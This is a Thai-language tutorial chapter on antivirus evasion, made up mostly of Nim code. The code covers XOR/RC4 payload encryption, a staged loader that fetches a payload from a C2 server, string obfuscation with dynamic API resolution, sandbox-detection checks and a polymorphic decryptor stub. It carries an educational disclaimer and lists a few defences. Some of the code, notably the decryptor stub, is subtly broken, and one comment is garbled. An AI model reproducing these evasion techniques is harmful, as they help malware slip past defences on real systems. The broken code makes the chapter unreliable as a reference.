# Part 34: AV Evasion Basics - การเลี่ยงหลบการตรวจจับ

> **คำเตือน**: ทุกเทคนิคในบทนี้มีไว้เพื่อการศึกษาวิธี AV/EDR detection,
> พัฒนา defensive tools, CTF competitions, และ authorized red team engagements **เท่านั้น**

## AV ทำงานอย่างไร

```
AV Detection Methods:
1. Signature-based    - ตรวจหา byte patterns ที่รู้จัก
2. Heuristic         - วิเคราะห์พฤติกรรม
3. Behavioral        - ตรวจสอบการกระทำที่ผิดปกติขณะ run
4. Sandbox           - Execute ในสภาพแวดล้อมจำลอง
5. Machine Learning  - AI/ML model ทำนายการตรวจจับ
6. Memory Scanning   - สแกน memory ขณะ runtime

For defenders: Understanding these helps build better detections.
For researchers: Understanding these helps test AV effectiveness.
```

## เตรียม Payload

```nim
# payload_prep.nim
# เตรียม shellcode แบบต่างๆ เพื่อทดสอบ AV
import strutils, sequtils

proc xorKey(data: seq[byte], key: seq[byte]): seq[byte] =
  result = newSeq[byte](data.len)
  for i in 0..<data.len:
    result[i] = data[i] xor key[i mod key.len]

proc rc4(data: seq[byte], key: seq[byte]): seq[byte] =
  ## RC4 stream cipher (simple but effective for basic AV evasion)
  var s = toSeq(0..255).mapIt(it.byte)
  var j = 0
  for i in 0..255:
    j = (j + s[i].int + key[i mod key.len].int) mod 256
    swap(s[i], s[j])
  
  result = newSeq[byte](data.len)
  var ii = 0
  j = 0
  for k in 0..<data.len:
    ii = (ii + 1) mod 256
    j = (j + s[ii].int) mod 256
    swap(s[ii], s[j])
    result[k] = data[k] xor s[(s[ii].int + s[j].int) mod 256]

proc caesar(data: seq[byte], shift: int): seq[byte] =
  result = data.mapIt((it.int + shift).byte)

# Example: encrypt payload for storage/transport
let payload = @[0x90.byte, 0x90.byte, 0x90.byte, 0xC3.byte]  # NOP NOP NOP RET

let key = @[0xDE.byte, 0xAD.byte, 0xBE.byte, 0xEF.byte]
let encrypted = xorKey(payload, key)
echo "Encrypted: ", encrypted.mapIt(it.toHex(2)).join(" ")

let decrypted = xorKey(encrypted, key)
echo "Decrypted: ", decrypted.mapIt(it.toHex(2)).join(" ")
echo "Match: ", decrypted == payload
```

## Staged Payload

```nim
# staged_loader.nim
# Multi-stage payload loading

when defined(windows):
  import asynchttpclient, asyncdispatch

  # Stage 1: Small stager (evades size-based heuristics)
  proc downloadAndExec(url: string) {.async.} =
    ## Stage 2+ downloaded from C2
    let client = newAsyncHttpClient()
    defer: client.close()
    
    # Download encrypted payload
    let resp = await client.get(url)
    let encryptedData = await resp.bodyStream.readAll()
    
    # Decrypt (key could be derived from env, hostname, etc.)
    let key = @[0xAA.byte, 0xBB.byte, 0xCC.byte]
    var payload = newSeq[byte](encryptedData.len)
    for i, b in encryptedData:
      payload[i] = b.byte xor key[i mod key.len]
    
    # Execute payload
    echo &"[+] Stage 2 downloaded: {payload.len} bytes"
    # injectShellcode(currentProcessId(), payload)
  
  # Environment keying - payload only runs in correct environment
  proc environmentKey(): string =
    ## Derive key from environment to avoid sandbox analysis
    import os
    result = getEnv("COMPUTERNAME", "") &
             getEnv("USERNAME", "") &
             getEnv("USERDOMAIN", "")
```

## String Obfuscation

```nim
# string_obfus.nim
# Avoid static string analysis

# XOR strings at compile time
macro xorStr(s: static string, key: static byte): string =
  import macros
  var encoded = newSeq[byte](s.len)
  for i, c in s:
    encoded[i] = c.byte xor key
  
  # Generate decode code
  result = quote do:
    block:
      let data: array[`s.len`, byte] = `encoded`
      var result = newString(data.len)
      for i, b in data:
        result[i] = char(b xor `key`)
      result

# Strings decoded at runtime, not visible in static analysis
let hiddenStr = xorStr("VirtualAlloc", 0x41.byte)
echo hiddenStr  # VirtualAlloc

# Split strings
proc getApiName(): string =
  let parts = ["Virtual", "Alloc"]  # Not detected as full string
  parts.join("")

# Dynamic API resolution (avoid import table)
when defined(windows):
  import winlean
  
  proc GetProcAddress*(hModule: HANDLE, lpProcName: cstring): pointer
    {.importc, dynlib: "kernel32".}
  proc GetModuleHandleA*(lpModuleName: cstring): HANDLE
    {.importc, dynlib: "kernel32".}
  proc LoadLibraryA*(lpLibFileName: cstring): HANDLE
    {.importc, dynlib: "kernel32".}
  
  type
    PVirtualAlloc = proc(lpAddress: pointer, dwSize: SIZE_T,
                         flAllocationType, flProtect: DWORD): pointer {.stdcall.}
  
  proc resolveVirtualAlloc(): PVirtualAlloc =
    let kernel32 = GetModuleHandleA("kernel32.dll")
    let fn = GetProcAddress(kernel32, "VirtualAlloc")
    cast[PVirtualAlloc](fn)
  
  let VirtualAllocFn = resolveVirtualAlloc()
  # Use VirtualAllocFn instead of direct import
```

## Sandbox Evasion

```nim
# sandbox_detection.nim
# ตรวจสอบ sandbox environment
# Educational: เชียงง

when defined(windows):
  import winlean, os, times, strutils

  # 1. Timing attack (sandboxes often fast-forward sleep)
  proc timingCheck(sleepMs: int = 2000): bool =
    let before = getTime()
    sleep(sleepMs)
    let elapsed = (getTime() - before).inMilliseconds()
    echo &"Sleep({sleepMs}ms) took {elapsed}ms"
    # If elapsed much less than sleepMs, probably sandbox
    elapsed >= sleepMs - 100

  # 2. User interaction check
  proc hasUserInteraction(): bool =
    when defined(windows):
      proc GetCursorPos*(lpPoint: pointer): BOOL
        {.importc, dynlib: "user32".}
      
      type POINT = object
        x, y: int32
      
      var p1, p2: POINT
      discard GetCursorPos(addr p1)
      sleep(2000)
      discard GetCursorPos(addr p2)
      
      # If cursor moved, likely real user
      (p1.x != p2.x) or (p1.y != p2.y)
    else:
      true

  # 3. Environment fingerprinting
  proc isLikelySandbox(): bool =
    let username = getEnv("USERNAME", "").toLowerAscii()
    let hostname = getEnv("COMPUTERNAME", "").toLowerAscii()
    
    # Common sandbox usernames
    let sandboxNames = @["sandbox", "malware", "virus", "test",
                         "analyser", "analyzer", "wilbert"]
    
    for name in sandboxNames:
      if name in username or name in hostname:
        return true
    
    # Very few running processes = sandbox
    # (real systems have 50+ processes)
    false

  # 4. Hardware check (VMs/sandboxes have fake hardware)
  proc checkHardware(): seq[string] =
    result = @[]
    
    # Check for VM-specific registry keys
    # HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
    # Identifier == "VBOX" or "VMWARE"
    result.add("Check: Registry SCSI hardware identifier")
    result.add("Check: CPUID hypervisor bit")
    result.add("Check: Number of CPU cores (usually 1-2 in VMs)")
    result.add("Check: MAC address vendor (VMware=00:50:56, VBox=08:00:27)")
  
  if isLikelySandbox():
    echo "[!] Sandbox detected, exiting"
  else:
    echo "[+] Looks like real environment"
    echo "[*] Hardware checks:"
    for check in checkHardware():
      echo "  ", check
```

## Polymorphic Code

```nim
# polymorphic.nim
# สร้าง code ที่เปลี่ยน signature แต่ทำงานเหมือนเดิม

import random, sequtils

proc generateDecryptorStub(encShellcode: seq[byte], key: byte): seq[byte] =
  ## Generate x64 decryptor stub (simplified concept)
  ## Real polymorphic engine would randomize register usage, insert junk code
  
  # XOR decryptor: for(int i=0; i<len; i++) buf[i] ^= key
  # In x64 assembly:
  # mov rcx, <len>
  # lea rdi, [rel decrypted]
  # .loop:
  # xor byte [rdi], <key>
  # inc rdi
  # loop .loop
  # jmp <decrypted>
  
  let len = encShellcode.len
  
  result = @[
    # MOV RCX, len (48 B9 xx xx xx xx xx xx xx xx)
    0x48.byte, 0xB9.byte] &
    cast[seq[byte]](len.uint64.toSeq()) &
    @[
    # XOR BYTE [RDI+RCX-1], key (40 30 7C 0F FF)
    0x40.byte, 0x30.byte, 0x7C.byte, 0x0F.byte, 0xFF.byte,
    # LOOP -5 (E2 FB)
    0xE2.byte, 0xFB.byte
  ]
  
  result &= encShellcode

proc insertJunkCode(shellcode: seq[byte], density: float = 0.1): seq[byte] =
  ## Insert NOP-equivalent junk to change signature
  ## Real engines use semantically equivalent substitutions
  
  let junkSleds = @[
    @[0x90.byte],                       # NOP
    @[0x87.byte, 0xC0.byte],            # XCHG EAX, EAX
    @[0x66.byte, 0x90.byte],            # 2-byte NOP
    @[0x40.byte, 0x90.byte],            # REX NOP
    @[0x48.byte, 0xFF.byte, 0xC0.byte,  # INC RAX
      0x48.byte, 0xFF.byte, 0xC8.byte], # DEC RAX (net zero)
  ]
  
  result = @[]
  for b in shellcode:
    if rand(1.0) < density:
      let junk = sample(junkSleds)
      result &= junk
    result.add(b)

# Defenses against polymorphic code:
echo "\n=== Defenses against polymorphic code ==="
echo "1. Emulation-based scanning (execute in sandbox)"
echo "2. Code normalization before signature matching"
echo "3. Behavioral analysis after execution"
echo "4. Hash-based detection of decrypted payload in memory"
echo "5. ML models trained on code structure, not bytes"
```

## สรุป Part 34

ในบทนี้เราได้เรียนรู้:
- ✅ วิธีการตรวจจับของ AV (signature, heuristic, behavioral, sandbox)
- ✅ Payload encryption (XOR, RC4)
- ✅ Staged payload loading
- ✅ String obfuscation
- ✅ Sandbox evasion เทคนิค
- ✅ Polymorphic code concepts
- ✅ Defense/detection recommendations

---

**Previous**: [Part 33 - Process Injection](part33_process_injection.md)
**Next**: [Part 35 - AMSI Bypass](part35_amsi_bypass.md)
